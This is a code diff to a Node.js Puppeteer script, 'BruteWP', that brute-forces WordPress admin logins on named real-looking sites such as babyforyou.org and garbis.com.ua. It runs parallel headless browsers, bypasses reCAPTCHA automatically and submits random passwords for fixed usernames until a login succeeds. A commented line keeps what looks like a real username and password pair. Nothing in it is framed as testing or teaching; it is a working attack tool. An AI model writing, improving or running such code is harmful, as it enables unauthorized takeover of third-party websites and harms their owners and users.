@@ -23,17 +23,23 @@ require('events').EventEmitter.defaultMaxListeners = 0;
 // console.log(process)
 class BruteWP {
     async init() {
+        this.threads = 10;
+        this.stop = false;
+        // this.url = "https://garbis.com.ua/wp-admin/";
+        // this.login = "Garbis";
+        this.url = "https://babyforyou.org/wp-admin/";
+        this.login = "badmin";
         new Promise((resolve,reject) => {
             console.time("Brute Work");
             this.n = 0;
             this.brute = tress((data, callback) => {
                 this.bruteInit(data, callback);
-            }, 10);
+            }, this.threads);
             this.brute.drain = () => {
                 console.timeEnd("Brute Work");
                 resolve();
             };
-            for ( let i = 0; i < 40; i++ ) {
+            for ( let i = 0; i < this.threads; i++ ) {
                 this.brute.push({});
             }
 
@@ -42,9 +48,8 @@ class BruteWP {
     }
     async bruteInit() {
         // return new Promise(async (resolve, reject) => {
-            let url = "https://babyforyou.org/wp-admin/";
+        //     let url = "https://babyforyou.org/wp-admin/";
             // let url = "https://artemida.ua/wp-admin/";
-            // let url = "https://garbis.com.ua/wp-admin/";
             // let url = "https://holiday.ua/wp-admin/";
             // let url = "https://nobimu.no/wp-admin";
             puppeteer.launch({args: ["--no-sandbox", '--disable-setuid-sandbox'], headless: true}).then(async browser => {//this.browser =
@@ -52,8 +57,8 @@ class BruteWP {
                 const page = await browser.newPage();
                 // await page.setViewport({width: 1280, height: 800});
                 await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36');
-                await page.setJavaScriptEnabled(false);
-                await page.goto(url);
+                //await page.setJavaScriptEnabled(false);//выключить js ВАЖНО
+                await page.goto(this.url);
                 await page.solveRecaptchas();
                 let status = "/wp-login.php";
                 // let status = await this.checkPassword({login:"Garbis1",password:"nE3qMdsLPRAg"},page);
@@ -64,18 +69,18 @@ class BruteWP {
 
                 do {
                     status = await this.checkPassword(
-                        {login:"badmin",
+                        {login:this.login,
                             password:this.generatePassword( Math.floor((Math.random() * (25 - 6)) + 6)) },
-                        page
-                    );
+                            page);
+
                     this.n++;
                     if (Number.isInteger(this.n/100)) {
                         console.log("WHILE = ", this.n);
                     }
-                } while (status == "/wp-login.php");
+                } while (status == "/wp-login.php" && this.stop === false);
                 this.brute.pause();
-                console.log("FIND PASSWORD");
-                resolve();
+                this.stop = true;
+                console.log("FIND PASSWORD", this.login, status);
             });
             // needle.get("https://garbis.com.ua/wp-login.php", {},(err, res) => { // { agent: myAgent },
             //     console.log(res);
@@ -107,25 +112,29 @@ class BruteWP {
         return new Promise(async (resolve, reject) => {
             // const page = this.page;
             // let urlEnd = true;
-            // do {
+            try {
+            await page.waitForSelector('input#user_login', { visible: true });
                let element =  await page.$('input#user_login');
-               await page.evaluate( el => el.value = "", element);
+               await page.evaluate( (el,data) => el.value = data.login, element, data);
                 // await page.focus('input#user_login');
-                await page.type('input#user_login', data.login, {delay: 0});
-                await page.$('input#user_pass');
-                await page.type('input#user_pass', data.password, {delay: 0});
+                // await page.type('input#user_login', data.login, {delay: 0});
+            await page.waitForSelector('input#user_pass', { visible: true });
+            element = await page.$('input#user_pass');
+            await page.evaluate( (el,data) => el.value = data.password, element, data);
+                // await page.type('input#user_pass', data.password, {delay: 0});
                 // await page.click('input#wp-submit');
                 // await page.waitForNavigation({waitUntil: 'networkidle0'});
                 await Promise.all([
-                    page.waitForResponse(response => response.url().indexOf("wp-login.php") > -1,{timeout: 15000}),
-                    page.click('input#wp-submit')
+                    page.click('input#wp-submit'),
+                    page.waitForResponse(response => response.url().indexOf("wp-login.php") > -1,{timeout: 15000})
                 ]);
                 let urlEnd = await page.evaluate(async () => location.pathname);
-            console.log(urlEnd, "  ", data.password, " = ",data.password.length );
+                console.log(urlEnd, "  ", data.password, " = ",data.password.length );
                 resolve(urlEnd);
-            // } while (urlEnd === '/wp-login.php')
-
-
+            } catch (err) {
+                console.log(err,"errPass");
+                resolve("/wp-login.php");
+            }
 
         });
     }
